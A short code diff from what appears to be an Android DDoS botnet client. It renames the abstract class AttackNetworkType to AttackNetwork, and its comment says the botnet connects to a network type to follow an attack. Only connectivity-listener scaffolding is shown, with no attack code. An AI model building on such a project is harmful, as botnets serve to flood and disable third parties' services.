@@ -10,7 +10,7 @@ import android.support.annotation.NonNull;
 * The ddos botnet must be connected to this network type in order to follow that attack.
 * */
 
-public abstract class AttackNetworkType {
+public abstract class AttackNetwork {
 
     public interface OnConnectionListener {
         void onConnected();
@@ -23,7 +23,7 @@ public abstract class AttackNetworkType {
     protected BroadcastReceiver connectivityReceiver;
     protected IntentFilter connectivityIntentFilter;
 
-    protected AttackNetworkType(@NonNull Context context, OnConnectionListener listener) {
+    protected AttackNetwork(@NonNull Context context, OnConnectionListener listener) {
         this.context = context;
         this.connectionListener = listener;
         this.initializeConnectivityReceiver();
